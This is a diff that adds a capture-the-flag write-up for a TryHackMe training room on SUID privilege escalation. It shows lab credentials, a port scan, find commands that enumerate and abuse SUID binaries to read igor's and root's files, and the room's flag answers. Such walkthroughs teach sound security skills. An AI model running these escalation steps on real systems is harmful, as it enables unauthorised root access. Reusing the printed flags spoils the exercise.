@@ -10,6 +10,49 @@ The link to the room can be found [here](https://tryhackme.com/room/25daysofchri
 ### Day 6: Data Elf-iltration
 ### Day 7: Skilling Up
 ### Day 8: SUID Shenanigans
+
+Deploy and SSH into the machine.
+Username: holly
+Password: tuD@4vt0G\*TU
+
+Machine IP: 10.10.68.225
+Scanned using command: `nmap 10.10.68.225 -p 1-65535`
+[Scan results](https://github.com/pamhrituc/TryHackMe_Writeups/blob/master/2019AdventOfCyber/nmap_scan_results/day8_suid.log)
+
+1. What port is SSH running on?
+
+   > 65534
+
+Logged into machine using SSH: `ssh holly@10.10.68.225 -p 65534`
+
+2. *Find* and run a file as *igor*. Read the file /home/igor/flag1.txt
+
+   Logged into machine using SSH: `ssh holly@10.10.68.225 -p 65534`
+   Find command that searches for files that igor owns with read permission, and execute ls: `find / -user igor -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
+   Find command that lets us execute cat on the specified file: `find /home/igor/flag1.txt -exec cat '{}' \;`
+
+   > THM{d3f0708bdd9accda7f937d013eaf2cd8}
+
+3. Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?
+
+   For this question, we're going to start by running this command: `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`. This command will find all files owned by root, with read permissions. Among the found files, I saw this:
+
+   ![screenshot_find](/2019AdventOfCyber/screenshots/day08/find.png?raw=true)
+
+   system-control
+
+   This binary allows us to use `su` as root.
+
+   ![screenshot_su](/2019AdventOfCyber/screenshots/day08/su.png?raw=true)
+
+   Now that we're root, we can view the contents of /root/flag2.txt
+
+   > THM{8c8211826239d849fa8d6df03749c3a2}
+
+4. If you've finished the challenge and want more practise, checkout the Privilege Escalation Playground room created by SherlockSec: https://tryhackme.com/room/privescplayground
+
+   > No answer needed
+
 ### Day 9: Requests
 
 I wrote a script that resolves this challenge. This script can be found in the [2019AdventOfCyber](https://github.com/pamhrituc/TryHackMe_Writeups/tree/master/2019AdventOfCyber) folder, under the name of [day9_requests.py](https://github.com/pamhrituc/TryHackMe_Writeups/blob/master/2019AdventOfCyber/day9_requests.py).
